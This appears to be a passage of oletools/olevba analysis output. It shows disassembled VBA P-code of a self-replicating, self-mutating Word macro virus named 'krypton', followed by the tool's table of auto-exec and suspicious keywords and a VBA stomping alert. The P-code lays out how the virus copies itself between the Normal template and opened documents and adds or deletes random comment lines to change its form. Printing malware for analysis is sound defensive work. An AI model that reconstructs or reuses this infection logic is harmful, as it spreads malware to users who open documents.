' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St jXjX 
' Line #186:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld jXjX 
' 	For 
' Line #187:
' 	LitStr 0x0007 "krypton"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ZjZj 
' Line #188:
' 	Ld Rnd 
' 	LitDI2 0x01C7 
' 	Mul 
' 	St a 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0050 
' 	Mul 
' 	St B 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00A0 
' 	Mul 
' 	St C 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00B4 
' 	Mul 
' 	St D 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0031 
' 	Mul 
' 	St e 
' Line #189:
' 	Ld ZjZj 
' 	LitStr 0x0001 "'"
' 	Ld a 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld B 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld C 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld D 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0007 "krypton"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #190:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	EndSub 
' Line #192:
' 	FuncDefn (Sub FileOpen())
' Line #193:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #194:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #195:
' 	Ld WordBasic 
' 	ArgsMemCall EnableAutoMacros 0x0000 
' Line #196:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #197:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #198:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "krypton"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #199:
' 	Dim 
' 	VarDefn C
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St C 
' 	BoS 0x0000 
' 	Ld C 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #200:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "krypton"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #201:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #202:
' 	EndSub 
' Line #203:
' 	FuncDefn (Sub Antigen())
' Line #204:
' 	OnError (Resume Next) 
' Line #205:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #206:
' 	LineNum 1 
' 	BoS 0x0003 
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "krypton"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #207:
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "krypton"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St e 
' Line #208:
' 	Ld e 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "krypton"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #209:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	GoTo 3 
' Line #211:
' 	LineNum 2 
' 	BoS 0x0003 
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #212:
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St e 
' Line #213:
' 	Ld e 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld O 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #214:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	NextVar 
' Line #215:
' 	LineNum 3 
' 	BoS 0x0000 
' Line #216:
' 	EndSub 
' Line #217:
' 	Rem 0x0000 ""
' Line #218:
' 	Rem 0x003D "                  MMM            MMMMMMMMM                 MM"
' Line #219:
' 	Rem 0x003D "                MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM"
' Line #220:
' 	Rem 0x003E "                 MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM"
' Line #221:
' 	Rem 0x003E "                  MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM"
' Line #222:
' 	Rem 0x003F "                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
' Line #223:
' 	Rem 0x003F "                  MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
' Line #224:
' 	Rem 0x003F "                  MMM        MMMMMMMMMMMMM           MMMMMMMMMM"
' Line #225:
' 	Rem 0x003F "                  MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM"
' Line #226:
' 	Rem 0x003F "                   MM         MMMMMMMM               M  MMMMMMM"
' Line #227:
' 	Rem 0x003F "                   MM        MMMMMMMMM             MMM   MMMMMM"
' Line #228:
' 	Rem 0x003F "                            MMMMMMMMMMMMMM      MMMMM    MMMMMM"
' Line #229:
' 	Rem 0x003E "                   MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM"
' Line #230:
' 	Rem 0x003E "                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM"
' Line #231:
' 	Rem 0x003D "                 MMMMMMMMMM                                MM"
' Line #232:
' 	Rem 0x0000 ""
' Line #233:
' 	Rem 0x0031 "                               CLASS<----->MODULE"
' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x0037 "163,9571   66,07912    8,951941    76,12047    16,61564"
' Line #236:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

